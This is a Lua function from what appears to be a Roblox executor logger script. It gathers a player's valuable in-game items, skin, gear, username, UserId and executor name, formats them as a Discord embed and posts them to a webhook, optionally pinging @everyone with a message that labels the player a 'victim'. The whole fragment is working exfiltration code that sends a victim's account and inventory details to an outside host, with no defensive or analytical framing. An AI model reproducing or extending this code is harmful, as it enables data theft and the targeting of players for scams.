local function buildAndSendEmbed(resultsList, webhookUrl, avatarUrl, ping, username, tagText)
    if #resultsList == 0 then return end
    table.sort(resultsList, function(a, b) return a.genVal > b.genVal end)

    local top = resultsList[1]
    local imageUrl = getBestImageUrl(top.displayName, top.index)
    local embedColor = colorToDecimal(getBrainrotColor(top.index))

    local lines = {}
    for i, r in ipairs(resultsList) do
        lines[i] = r.name .. " — **" .. r.genStr .. "**"
    end
    local listText = table.concat(lines, "\n")
    if #listText > 3800 then listText = listText:sub(1, 3796) .. "..." end

    local execName = "Unknown"
    pcall(function()
        if identifyexecutor then execName = identifyexecutor()
        elseif getexecutorname then execName = getexecutorname() end
    end)

    local baseSkinText = getBaseSkinListForEmbed()
    local gearText = getGearListForEmbed()
    local gearQueue = buildGearQueue()

    local embed = {
        title       = (tagText and ("[" .. tagText .. "] ") or "") .. top.displayName .. " — " .. top.genStr,
        description = listText,
        color       = embedColor,
        fields      = {
            { name = "🎨 Base Skin", value = baseSkinText, inline = false },
            { name = "⚔️ Gears (" .. #gearQueue .. ")", value = gearText, inline = false },
            { name = "Server", value = "Players: **" .. #Players:GetPlayers() .. "** | <t:" .. os.time() .. ":R>", inline = true },
            { name = "Executor", value = execName, inline = true },
            { name = "User", value = LP.Name .. " (`" .. LP.UserId .. "`)", inline = true },
        },
        footer      = { text = LP.Name .. " • " .. LP.UserId },
        timestamp   = os.date("!%Y-%m-%dT%H:%M:%SZ"),
    }
    if imageUrl then embed.thumbnail = { url = imageUrl } end

    local payloadData = {
        embeds     = { embed },
        username   = username or "LOGGER",
        avatar_url = avatarUrl or "",
    }
    if ping then payloadData.content = ".gg/irish victim||@everyone||" end

    local payload = HttpService:JSONEncode(payloadData)
    sendWebhookWithRetry(webhookUrl, payload, 3)
end

